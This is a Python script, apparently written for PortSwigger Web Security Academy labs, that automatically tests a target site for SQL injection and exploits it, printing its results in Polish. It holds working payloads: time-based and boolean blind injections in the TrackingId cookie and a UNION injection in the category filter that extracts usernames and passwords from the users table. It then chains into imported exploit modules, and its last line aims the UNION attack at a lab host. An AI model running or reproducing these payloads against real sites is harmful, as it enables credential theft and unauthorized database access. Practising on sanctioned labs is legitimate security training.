import requests
import portSwiggerSimpleSqli
import portSwiggerBlingSqli
import unionAttack
import blindTimeBased

def isTrackingID(url):
    session = requests.Session()
    response = session.get(url)
    t = session.cookies.get_dict()
    if not 'TrackingId' in t:
        return 0
    return 1


def tblindTimeBase(url):
    if not isTrackingID(url):
        return 0
    session = requests.Session()
    response = session.get(url)
    track = session.cookies.get_dict()["TrackingId"]
    trackingID = track + "'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
    response = requests.get(url, cookies={'TrackingId': trackingID})
    if response.elapsed.seconds > 8:
        return 1
    else:
        return 0


def tblindSql(url):
    if not isTrackingID(url):
        return 0
    session = requests.Session()
    response = session.get(url)
    track = session.cookies.get_dict()["TrackingId"]
    trackingID = track + "\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>1)=\'a"
    response = requests.get(url, cookies={'TrackingId': trackingID})
    if "Welcome back" in response.text:
        return 1
    return 0


def tsimpleSql(url):
    if portSwiggerSimpleSqli.simpleSQL(url):
        return 1
    else:
        return 0


def tunionAttack(url):
    url1 = url + "filter?category=Lifestyle%27%20UNION%20SELECT%20NULL,%20username%20||%20%27*%27%20||%20password%20FROM%20users--"
    session = requests.session()
    resp = session.get(url1).text
    if "administrator" in resp:
        return 1
    else:
        return 0




def enumerate(url):
    if tsimpleSql(url):
        print("Wykryto podatność Simple SQL Injection")
        print("Pomyślnie wykonano penetrację")
    elif tunionAttack(url):
        print("Wykryto podatność Union SQL Attack")
        if unionAttack.unionAttack(url):
            print("Pomyślnie wykonano penetrację")
        else:
            print("Nie udało się wykonać penetracji")
    elif tblindSql(url):
        print("Wykryto podatność Blind SQL Injection")
        if portSwiggerBlingSqli.blindSQL(url):
            print("Pomyślnie wykonano penetrację")
        else:
            print("Nie udało się wykonać penetracji")
    elif tblindTimeBase(url):
        print("Wykryto podatność Blind Time Based SQL Injection")
        if blindTimeBased.blindTime(url):
            print("Pomyślnie wykonano penetrację")
        else:
            print("Nie udało się wykonać penetracji")
print(tunionAttack("https://aca71fde1fc534b3c0e80a43009c00e7.web-security-academy.net/"))